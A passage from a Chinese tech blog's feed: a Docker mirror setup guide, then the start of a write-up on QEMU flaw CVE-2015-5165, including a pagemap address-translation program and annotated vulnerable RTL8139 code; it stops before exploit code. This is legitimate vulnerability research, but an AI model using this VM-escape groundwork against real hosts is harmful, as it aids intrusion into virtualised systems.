rel="noopener">World Geodetic System - Wikipedia</a></li><li><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%9C%B0%E7%90%86%E6%95%B0%E6%8D%AE%E9%99%90%E5%88%B6#GCJ-02" target="_blank" rel="noopener">GCJ-02 - Wikipedia</a></li><li><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E5%9C%B0%E7%90%86%E6%95%B0%E6%8D%AE%E9%99%90%E5%88%B6#BD-09" target="_blank" rel="noopener">BD-09 - Wikipedia</a></li><li><a href="https://steppark.net/15294912961206.html" target="_blank" rel="noopener">妙用 Xcode 修改 iPhone 的当前定位位置</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;未越狱 iOS 设备通过 Xcode 修改 GPS 定位信息。&lt;/p&gt;
    
    </summary>
    
      <category term="Apple" scheme="https://programlife.net/categories/Apple/"/>
    
      <category term="iOS" scheme="https://programlife.net/categories/Apple/iOS/"/>
    
    
      <category term="iOS" scheme="https://programlife.net/tags/iOS/"/>
    
      <category term="GPS" scheme="https://programlife.net/tags/GPS/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu Snap Docker 国内加速镜像设置</title>
    <link href="https://programlife.net/2020/09/12/ubuntu-snap-docker-registry-mirrors/"/>
    <id>https://programlife.net/2020/09/12/ubuntu-snap-docker-registry-mirrors/</id>
    <published>2020-09-12T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>为 Ubuntu 下通过 Snap 安装的 Docker 设置国内加速镜像（Registry Mirrors）。</p><a id="more"></a><p>关于 Ubuntu 下 Docker 国内加速镜像的设置，目前搜索引擎能搜到的文章大部分都是针对 apt 安装的 Docker 的，主要通过修改配置文件 <code>/etc/docker/daemon.json</code> 添加国内加速镜像地址（以中科大为例）：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"registry-mirrors"</span>: [<span class="string">"https://docker.mirrors.ustc.edu.cn/"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关加速镜像还有：</p><ol><li>Docker 官方镜像 <code>https://registry.docker-cn.com</code></li><li>网易镜像 <code>https://hub-mirror.c.163.com</code></li><li>腾讯镜像 <code>https://mirror.ccs.tencentyun.com</code></li><li>七牛镜像 <code>https://reg-mirror.qiniu.com</code></li><li>阿里云镜像（需要注册登陆，无公开地址）</li></ol><p>目前最新的 Ubuntu 20.04 使用 snap 安装 Docker 非常方便，不需要修改源的设置，直接一条命令即可安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo snap install docker</span><br></pre></td></tr></table></figure><p>但是上述国内加速镜像的设置方法对通过 snap 安装的 Docker 无效！通过 snap 安装的 Docker 的配置文件位于 <code>/var/snap/docker/current/config/daemon.json</code> ，往其中添加加速镜像的设置即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cat /var/snap/docker/current/config/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">    "log-level":        "error",</span><br><span class="line">    "storage-driver":   "overlay2",</span><br><span class="line">    "registry-mirrors": ["https://hub-mirror.c.163.com"]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置好之后通过 snap 重启 Docker 服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo snap restart docker</span><br></pre></td></tr></table></figure><p>通过 <code>docker info</code> 命令检查设置是否生效（观察 <strong>Registry Mirrors</strong> 字段）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Registry: https://index.docker.io/v1/</span><br><span class="line">Labels:</span><br><span class="line">Experimental: false</span><br><span class="line">Insecure Registries:</span><br><span class="line"> 127.0.0.0/8</span><br><span class="line">Registry Mirrors:</span><br><span class="line"> https://hub-mirror.c.163.com/</span><br><span class="line">Live Restore Enabled: false</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为 Ubuntu 下通过 Snap 安装的 Docker 设置国内加速镜像（Registry Mirrors）。&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="https://programlife.net/categories/Virtualization/"/>
    
      <category term="Docker" scheme="https://programlife.net/categories/Virtualization/Docker/"/>
    
    
      <category term="Ubuntu" scheme="https://programlife.net/tags/Ubuntu/"/>
    
      <category term="Snap" scheme="https://programlife.net/tags/Snap/"/>
    
      <category term="Docker" scheme="https://programlife.net/tags/Docker/"/>
    
      <category term="daemon.json" scheme="https://programlife.net/tags/daemon-json/"/>
    
  </entry>
  
  <entry>
    <title>QEMU 信息泄露漏洞 CVE-2015-5165 分析及利用</title>
    <link href="https://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/"/>
    <id>https://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/</id>
    <published>2020-06-30T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>参考 Phrack 文章 <strong><em>VM escape - QEMU Case Study</em></strong> [1] 对 QEMU 信息泄露漏洞 CVE-2015-5165 和堆溢出漏洞 CVE-2015-7504 进行调试分析并编写 Exploit 代码，本文主要分析其中的 RTL8139 网卡信息泄露漏洞 CVE-2015-5165。</p><a id="more"></a><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01. 环境搭建"></a>0x01. 环境搭建</h2><h3 id="1-1-宿主机创建"><a href="#1-1-宿主机创建" class="headerlink" title="1.1 宿主机创建"></a>1.1 宿主机创建</h3><p>在 VMware Workstation 中创建 Ubuntu 20.04 虚拟机，并为虚拟机的 CPU 开启虚拟化引擎相关选项，使之支持嵌套虚拟化，以便对 QEMU 进行调试分析。</p><p>安装好 Ubuntu 之后，可以先将源设置为国内的开源镜像网站，之后执行如下命令更新系统组件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get upgrade</span></span><br></pre></td></tr></table></figure><p>编译 QEMU 需要 Python 2，因为 Ubuntu 20.04 中只有 Python 3，所以需要自行安装 Python 2：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install python2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /usr/bin/python2 /usr/bin/python</span></span><br></pre></td></tr></table></figure><p>编译 QEMU 所依赖的其他库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev</span></span><br></pre></td></tr></table></figure><h3 id="1-2-QEMU-编译"><a href="#1-2-QEMU-编译" class="headerlink" title="1.2 QEMU 编译"></a>1.2 QEMU 编译</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git://git.qemu-project.org/qemu.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> qemu</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout bd80b59</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir -p bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> bin/debug/native</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ../../../configure --target-list=x86_64-softmmu \</span></span><br><span class="line">    --enable-debug --disable-werror</span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure><p>如果出现以下错误，给文件 <code>commands-posix.c</code> 增加头文件 <code>&lt;sys/sysmacros.h&gt;</code> 即可解决 [2]。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor':</span><br><span class="line">/repo/qemu/qga/commands-posix.c:640: undefined reference to `major'</span><br><span class="line">/usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to `minor'</span><br></pre></td></tr></table></figure><h3 id="1-3-虚拟机创建"><a href="#1-3-虚拟机创建" class="headerlink" title="1.3 虚拟机创建"></a>1.3 虚拟机创建</h3><p>QEMU 编译完成之后，需要创建一个用于调试漏洞的虚拟机。为了调试方便，这里安装 Ubuntu 20.04 Server 版本（比较新的 Ubuntu Server 没有 32 位的版本，但这里建议安装一个 32 位的系统，因为后面的 PoC 和 Exploit 都是针对 32 位环境编写的），相关命令如下所示 [3]：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./qemu-img create -f qcow2 ~/Desktop/vm/ubuntu.img 10G</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -boot d -cdrom \</span></span><br><span class="line">    /mnt/hgfs/share/ubuntu-20.04-live-server-amd64.iso \</span><br><span class="line">    -hda ~/Desktop/vm/ubuntu.img -m 1024</span><br></pre></td></tr></table></figure><p>这里还需要安装一个 VNC Viewer [4]，以便远程访问虚拟机，下载 deb 安装包后使用如下命令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb</span></span><br></pre></td></tr></table></figure><p>之后就可以通过 VNC Viewer 来访问虚拟机了。</p><h2 id="0x02-内存映射"><a href="#0x02-内存映射" class="headerlink" title="0x02. 内存映射"></a>0x02. 内存映射</h2><p>和 Host 操作系统一样，Guest 操作系统中的每个进程都有自己的虚拟地址空间，这里称之为 Guest Virtual Address，即 GVA；通过进程自身的页表（Page Table），Guest 操作系统可以将 GVA 转换为对应的 GPA（Guest Physical Address）。</p><p>Guest 操作系统的 GPA，实际上是对应的 QEMU 进程中映射的虚拟内存，即 HVA（Host Virtual Address）；Host 操作系统同样通过对应进程的页表，最终将其转换为对应的 HPA（Host Physical Address）。</p><p>待 Ubuntu Server 虚拟机安装完毕后，可以通过如下命令启动该虚拟机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -m 2048 -drive \</span></span><br><span class="line">    file=~/Desktop/vm/ubuntu.img,format=qcow2,if=ide,cache=writeback</span><br></pre></td></tr></table></figure><p>这里给虚拟机分配了 2GB 的内存，可以在对应的 QEMU 进程中找到对应的虚拟内存：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ps -e|grep qemu</span></span><br><span class="line">   4407 pts/1    00:01:14 qemu-system-x86</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /proc/4407/maps</span></span><br><span class="line">......</span><br><span class="line">7fe880021000-7fe884000000 ---p 00000000 00:00 0 </span><br><span class="line">7fe884000000-7fe904000000 rw-p 00000000 00:00 0         [2GB RAM]</span><br><span class="line">7fe904000000-7fe90465d000 rw-p 00000000 00:00 0 </span><br><span class="line">......</span><br><span class="line">7ffc9f4a1000-7ffc9f4c2000 rw-p 00000000 00:00 0         [stack]</span><br><span class="line">7ffc9f4fd000-7ffc9f500000 r--p 00000000 00:00 0         [vvar]</span><br><span class="line">7ffc9f500000-7ffc9f501000 r-xp 00000000 00:00 0         [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall]</span><br></pre></td></tr></table></figure><p>关于 Guest Virtual Address 到 Host Virtual Address 的转换，Phrack 的文章没怎么解释，在网上找到另一篇文章 [5] 解释的比较清楚（以 64 位系统为例）：</p><ol><li><p>每个页面的大小为 <code>4096</code> 字节，即 <code>1 &lt;&lt; 12</code> ；</p></li><li><p>基于 <code>/proc/pid/pagemap</code> 可以查看进程任意 Virtual Page 的状态，包括是否被映射到物理内存以及在物理内存中的 Page Frame Number（PFN）等；</p><ul><li><code>pagemap</code> 文件为每个 Virtual Page 存储 <code>64</code> 位（即 <code>8</code> 字节）的信息，数据格式如下：</li></ul></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Bits 0-54  page frame number (PFN) if present</span><br><span class="line">Bits 0-4   swap type if swapped</span><br><span class="line">Bits 5-54  swap offset if swapped</span><br><span class="line">Bit  55    pte is soft-dirty</span><br><span class="line">Bit  56    page exclusively mapped (since 4.2)</span><br><span class="line">Bits 57-60 zero</span><br><span class="line">Bit  61    page is file-page or shared-anon (since 3.5)</span><br><span class="line">Bit  62    page swapped</span><br><span class="line">Bit  63    page present</span><br></pre></td></tr></table></figure><ol start="3"><li><p>对任意的虚拟地址 <code>address</code> ，基于 <code>address / 4096</code> 可以计算出该虚拟地址在 <code>pagemap</code> 文件中的索引值， <code>address / 4096 * 8</code> 即对应的文件偏移值；</p></li><li><p>对任意的虚拟地址 <code>address</code> ，<code>address % 4096</code> 即虚拟地址在对应的内存页中的偏移值；</p></li><li><p>基于物理内存的 PFN 以及页内偏移，就可以计算出对应的物理地址；</p></li></ol><p>获取虚拟地址对应的物理地址的代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">char</span>* ptr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_addr(<span class="keyword">char</span>* ptr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(ptr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)ptr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* ptr = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">"Where am I?"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Physical address: 0x%"</span> PRIx64 <span class="string">"\n"</span>, get_physical_addr(ptr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Press any key to exit...\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据文档 [6] 可知，只有拥有 <code>CAP_SYS_ADMIN</code> 权限的进程才可以读取到 PFN，否则虽然可以打开 <code>pagemap</code> 文件，但是读取到的 PFN 将会是 <code>0</code> 。</p><blockquote><p>Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs.<br>In 4.0 and 4.1 opens by unprivileged fail with -EPERM.  Starting from<br>4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN.<br>Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</p></blockquote><p>编译好程序之后将其上传到 QEMU 虚拟机中以 <code>root</code> 身份执行，打印出物理地址为 <code>0x617192a0</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./a.out</span></span><br><span class="line">Where am I?</span><br><span class="line">Physical address: 0x617192a0</span><br><span class="line">Press any key to exit...</span><br></pre></td></tr></table></figure><p>在宿主机中使用 GDB 附加到 QEMU 进程，可以看到虚拟机中的物理地址实际上就是 QEMU 进程为虚拟机分配的内存所在的 Host Virtual Address 的偏移地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo gdb qemu-system-x86 4407</span></span><br><span class="line">(gdb) x /s 0x7fe884000000 + 0x617192a0</span><br><span class="line">0x7fe8e57192a0:"Where am I?"</span><br></pre></td></tr></table></figure><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03. 漏洞分析"></a>0x03. 漏洞分析</h2><h3 id="3-1-漏洞简介"><a href="#3-1-漏洞简介" class="headerlink" title="3.1 漏洞简介"></a>3.1 漏洞简介</h3><p>CVE-2015-5165 是 QEMU 在模拟 Realtek RTL8139 网卡时存在的一个漏洞，具体为文件 <code>hw\net\rtl8139.c</code> 中的函数 <code>rtl8139_cplus_transmit_one</code> 在发送数据时没有检查 IP 数据包头部的长度 <code>hlen</code> 与整个 IP 数据包的长度 <code>ip-&gt;ip_len</code> 之间的关系，导致在计算数据长度的时候存在整数溢出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*uint16_t*/</span> ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</span><br></pre></td></tr></table></figure><p>利用该漏洞可以把越界读取到的数据通过网络发送出去。</p><h3 id="3-2-基础知识"><a href="#3-2-基础知识" class="headerlink" title="3.2 基础知识"></a>3.2 基础知识</h3><h4 id="3-2-1-Ethernet-Frame-Format"><a href="#3-2-1-Ethernet-Frame-Format" class="headerlink" title="3.2.1 Ethernet Frame Format"></a>3.2.1 Ethernet Frame Format</h4><p>OSI（Open Systems Interconnection）将网络协议分为七层，从上往下依次为：</p><ul><li>应用层</li><li>表示层</li><li>会话层</li><li>传输层</li><li>网络层</li><li>数据链路层</li><li>物理层</li></ul><p>以太网帧（Ethernet Frame）在数据链路层传输，格式参考下图中的灰色部分 [7]：</p><p><img src="/uploads/202006/ethernet-frame.png" alt="Ethernet Frame Format"></p><p>相关字段解释：</p><ul><li>DST / SRC 为目标 / 源的 MAC 地址</li><li><p>Length / Type：</p><ul><li>如果值小于等于 <code>1500</code> ，则表示 Payload 的长度</li><li>否则表示 Payload 数据所使用的协议，比如 <code>0x0800</code> 表示 IP 协议（这里指 IPv4）</li></ul></li><li><p>Payload 的 MTU（Maximum Transmission Unit）为 <code>1500</code> 字节，当数据超出 MTU 时需要进行分片处理</p></li></ul><h4 id="3-2-2-IP-Packet-Format"><a href="#3-2-2-IP-Packet-Format" class="headerlink" title="3.2.2 IP Packet Format"></a>3.2.2 IP Packet Format</h4><p>IP 数据包（这里指 IPv4）在网络层传输，格式参考下图 [7]：</p><p><img src="/uploads/202006/ip-packet.png" alt="IP Packet Format"></p><p>相关字段解释：</p><ul><li>IHL（Internet Header Length）表示 IP Header 的长度，最大可以是 <code>0b1111 * 4 = 60</code> 字节</li><li>Total Length 表示整个 IP Packet 的长度，最大可以是 <code>65535</code> 字节</li><li>IP Data 的最大长度为 <code>65535 - 20 = 65515</code> 字节<ul><li>此时 IP Header 的长度为 <code>20</code> 字节，Options 字段的长度为 <code>0</code> 字节</li></ul></li></ul><h4 id="3-2-3-TCP-Segment-Format"><a href="#3-2-3-TCP-Segment-Format" class="headerlink" title="3.2.3 TCP Segment Format"></a>3.2.3 TCP Segment Format</h4><p>TCP 报文在传输层传输，格式参考下图 [7]：</p><p><img src="/uploads/202006/tcp-segment.png" alt="TCP Segment Format"></p><p>和 IP 数据包一样，TCP 报文头部的长度由 <code>Header Length</code> 字段指明，最大可以是 <code>0b1111 * 4 = 60</code> 字节，在 <code>Options</code> 字段为空的情况下头部长度为 <code>20</code> 字节。</p><h3 id="3-3-漏洞分析"><a href="#3-3-漏洞分析" class="headerlink" title="3.3 漏洞分析"></a>3.3 漏洞分析</h3><p>漏洞位于文件 <code>hw\net\rtl8139.c</code> 中的函数 <code>rtl8139_cplus_transmit_one</code> ，相关代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETHER_ADDR_LEN 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETHER_TYPE_LEN 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_HLEN (ETHER_ADDR_LEN * 2 + ETHER_TYPE_LEN)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_P_IP    0x0800      <span class="comment">/* Internet Protocol packet */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_P_8021Q 0x8100      <span class="comment">/* 802.1Q VLAN Extended Header  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_MTU     1500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ip packet header */</span></span><br><span class="line">ip_header *ip = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> hlen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint8_t</span>  ip_protocol = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> ip_data_len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *eth_payload_data = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">size_t</span>   eth_payload_len  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// saved_buffer 指向 Ethernet Frame, 这里读取 Length/Type 字段</span></span><br><span class="line"><span class="keyword">int</span> proto = be16_to_cpu(*(<span class="keyword">uint16_t</span> *)(saved_buffer + <span class="number">12</span>));</span><br><span class="line"><span class="keyword">if</span> (proto == ETH_P_IP)  <span class="comment">// Payload 为 IP Packet</span></span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"+++ C+ mode has IP packet\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* not aligned */</span></span><br><span class="line">    eth_payload_data = saved_buffer + ETH_HLEN; <span class="comment">// Payload 数据</span></span><br><span class="line">    eth_payload_len  = saved_size   - ETH_HLEN; <span class="comment">// Payload 大小</span></span><br><span class="line"></span><br><span class="line">    ip = (ip_header*)eth_payload_data;          <span class="comment">// IP Packet</span></span><br><span class="line">    <span class="comment">// 检查是否为 IPv4</span></span><br><span class="line">    <span class="keyword">if</span> (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) &#123;</span><br><span class="line">        DPRINTF(<span class="string">"+++ C+ mode packet has bad IP version %d "</span></span><br><span class="line">            <span class="string">"expected %d\n"</span>, IP_HEADER_VERSION(ip),</span><br><span class="line">            IP_HEADER_VERSION_4);</span><br><span class="line">        ip = <span class="literal">NULL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        hlen = IP_HEADER_LENGTH(ip);            <span class="comment">// IP 头长度</span></span><br><span class="line">        ip_protocol = ip-&gt;ip_p;</span><br><span class="line">        <span class="comment">// 计算 IP 数据包中数据的长度, 这里 ip_data_len 的类型为 uint16_t</span></span><br><span class="line">        <span class="comment">// 当 be16_to_cpu(ip-&gt;ip_len) &lt; hlen 触发整数溢出</span></span><br><span class="line">        <span class="comment">// ip_data_len 最大可以是 0xFFFF</span></span><br><span class="line">        ip_data_len = be16_to_cpu(ip-&gt;ip_len) - hlen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里尝试从 Ethernet Frame 中解析 IPv4 数据包，在计算 IP 